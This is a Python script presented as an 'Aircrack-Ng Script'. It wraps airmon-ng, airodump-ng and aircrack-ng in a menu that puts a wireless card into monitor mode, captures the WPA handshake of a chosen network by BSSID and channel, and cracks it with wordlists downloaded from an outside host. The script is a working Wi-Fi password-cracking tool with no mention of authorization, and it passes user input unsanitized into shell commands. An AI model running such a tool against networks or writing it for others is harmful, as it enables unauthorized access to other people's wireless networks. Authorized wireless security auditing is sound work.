import os
import requests
from pprint import pformat
from tqdm import tqdm

PreviousOutput = None
output = None
ListeningMode = False
PreviousPath = None


def ShowNetCard():
    output = os.popen('ifconfig')
    data = output.read()
    print(data)
    return data


def StartListenerMode(netcard):
    os.system('airmon-ng check kill')
    os.system(f'airmon-ng start {netcard}')
    global ListeningMode
    ListeningMode = True
    print('Started')


def DumpStatus(NetCard):
    print('Double-press Q to exit. When you are ready, press enter.')
    input()
    os.system(f'airodump-ng {NetCard}')


def CapturePacket(channel: int, bssid: str, netcard: str, path='./captured'):
    print('Double-press Q to exit. When you are ready, press enter.')
    input()
    os.system(
        f'airodump-ng -w {path} --channel {channel} --bssid {bssid} {netcard}')


def CrackWithDict(path, dictionary):
    os.system('airmon-ng check kill')
    os.system(f'aircrack-ng {path} -w {dictionary}')


def Downloader(url: str, filename: str):
    resp = requests.get(url, stream=True)
    total = int(resp.headers.get('content-length', 0))
    with open(filename, 'wb') as file, tqdm(
        desc=filename,
        total=total,
        unit='iB',
        unit_scale=True,
        unit_divisor=1024,
    ) as bar:
        for data in resp.iter_content(chunk_size=1024):
            size = file.write(data)
            bar.update(size)


help_msg = '''{:=^80}
[0] Show netcards
[1] Start listener
[2] Dump wlan status
[3] Capture heartbeat packet
[4] Crack the packet with a dictionary
[q] Exit
{:=^80}
'''.format(' Aircrack-Ng Script ', ' Made by GamerNoTitle ')

LogoPrint = r'''           _                         _           _   _          _____           _       _   
     /\   (_)                       | |         | \ | |        / ____|         (_)     | |  
    /  \   _ _ __ ___ _ __ __ _  ___| | ________|  \| | __ _  | (___   ___ _ __ _ _ __ | |_ 
   / /\ \ | | '__/ __| '__/ _` |/ __| |/ /______| . ` |/ _` |  \___ \ / __| '__| | '_ \| __|
  / ____ \| | | | (__| | | (_| | (__|   <       | |\  | (_| |  ____) | (__| |  | | |_) | |_ 
 /_/    \_\_|_|  \___|_|  \__,_|\___|_|\_\      |_| \_|\__, | |_____/ \___|_|  |_| .__/ \__|
                                                        __/ |                    | |        
                                                       |___/                     |_|        -- GamerNoTitle '''

if __name__ == '__main__':
    print(LogoPrint)
    if os.geteuid() != 0:
        print('You need to run it as root!')
        os._exit(0)
    while True:
        print(help_msg)
        Input = input('Please choose an option: ')
        if Input == '0':
            CardsInfo = ShowNetCard()
        if Input == '1':
            Netcard = input(
                'Please type the netcard\'s name that you wanna use: ')
            if 'wlan' not in Netcard:
                print(f'Unsupported netcard! {Netcard}')
            else:
                StartListenerMode(Netcard)
        if Input == '2':
            if ListeningMode:
                Netcard = input(
                    'Please type the netcard\'s name that you wanna use: ')
                NetCards = CardsInfo.split('\n\n')
                if 'wlan' not in Netcard:
                    print(f'Unsupported netcard! {Netcard}')
                else:
                    HaveCard = False
                    for i in NetCards:
                        if Netcard in i:
                            HaveCard = True
                    if HaveCard:
                        DumpStatus(Netcard)
                    else:
                        print(
                            f'Unable to find netcard {Netcard} in {NetCards}')
            else:
                print('You need to start the listener first!')
        if Input == '3':
            path = input(
                'Please input the path that you want to save the file (e.g: ./captured): ')
            PreviousPath = path
            channel = int(
                input('Please input the channel that you want to listen to: '))
            bssid = input('Please input the bssid you want to listen to: ')
            netcard = input('Please input the netcard you want to use: ')
            if path == '' or channel == '' or bssid == '' or netcard == '':
                print('Invalid parameters!')
            else:
                CapturePacket(channel=channel, bssid=bssid,
                              netcard=netcard, path=path)
        if Input == '4':
            path = input(
                f'Please input the file you want to crack (Default for the previous file {PreviousPath}): ')
            if path == '':
                path = PreviousPath
            dictionary = input(
                'Please input the dictionary that you want to use to crack: ')
            if dictionary == '':
                print('You haven\'t specify a dictionary to crack the packet! Do you need some dictionarys? The avaliable dictionarys are listed below: ')
                dictionarys = requests.get(
                    'https://gamernotitle.coding.net/p/Dictionarys/d/WIFI/git/raw/master/metadata.json?download=true').json()
                print(pformat(dictionarys))
                option = input(
                    'Please input the name of the dictionary you want to use: ')
                if option == '':
                    print('You need to specify a dictionary to crack the packet!')
                else:
                    Downloader(dictionarys['data'][option]
                               ['link'], f'./{option}.txt')
                    dictionary = f'{option}.txt'
                    print(
                        f'Start cracking {path} with dictionary {dictionary}')
                    CrackWithDict(path, dictionary)
            else:
                print(f'Start cracking {path} with dictionary {dictionary}')
                CrackWithDict(path, dictionary)
        if Input == 'q':
            os._exit(0)
